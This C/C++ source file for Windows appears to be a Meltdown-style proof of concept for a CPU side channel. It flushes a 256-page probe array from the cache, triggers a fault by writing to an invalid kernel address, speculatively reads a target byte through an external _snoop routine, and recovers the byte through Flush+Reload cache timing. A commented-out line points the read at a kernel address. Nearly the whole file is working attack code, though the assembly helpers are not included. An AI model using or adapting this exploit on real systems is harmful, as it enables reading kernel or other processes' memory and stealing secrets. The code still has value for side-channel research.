#include <stdint.h>
#include <stdio.h>

#include <windows.h>

extern "C" {
    void _snoop(size_t addr, size_t arr);
    size_t _probe(size_t addr);
    void _clflush(size_t addr);
}

uint8_t crap[256 * 0x1000];

static void flush()
{
    for (size_t i = 0; i < 256; ++i)
        _clflush((size_t)&crap[i * 4096]);
}

struct measure_t {
    size_t i_min;
    size_t i_max;
    size_t t_min;
    size_t t_max;
};

static void measure(measure_t* m)
{
    size_t tm[256];
    for (size_t i = 0; i < 256; ++i)
        tm[i] = _probe((size_t)&crap[i * 4096]);

    size_t i_min = 256;
    size_t i_max = 0;
    size_t t_min = 100000;
    size_t t_max = 0;

    for (size_t i = 0; i < 256; ++i) {
        if (tm[i] > t_max) {
            t_max = tm[i];
            i_max = i;
        }
        if (tm[i] < t_min) {
            t_min = tm[i];
            i_min = i;
        }
    }

    m->i_min = i_min;
    m->i_max = i_max;
    m->t_min = t_min;
    m->t_max = t_max;
}

int main()
{
    flush();

    measure_t m;
    measure(&m);
    
    printf("(%zd %zd) (%zd %zd)\n", m.i_min, m.i_max, m.t_min, m.t_max);
    printf("-------\n");

    size_t dupa[] = { 49, 11, 123, 56, 2, 66, 91, 45, 61, 55, 55 };

    size_t n_loop = 64;
    size_t n_tries = 100;

    size_t addr = (size_t)dupa;
    //size_t addr = 0xfffff8007467d000;

    size_t bogus_addr = 0xffff808080808080;

    for (size_t i = 0; i < n_loop; ++i) {
        size_t n = n_tries;
        while (n--) {
            __try {
                uint8_t* p = (uint8_t*)bogus_addr;
                p[0] = 0xfe;

                _snoop(addr, (size_t)crap);
            }
            __except (EXCEPTION_EXECUTE_HANDLER) {
                for (volatile int z = 0; z < 100; z++) {}
            }

            measure(&m);
            if (m.t_min < 100) {
                printf("addr %16llx r=%zd\n", addr, m.i_min);
                break;
            }
        }

        addr += 0x1;
    }

    return 0;
}
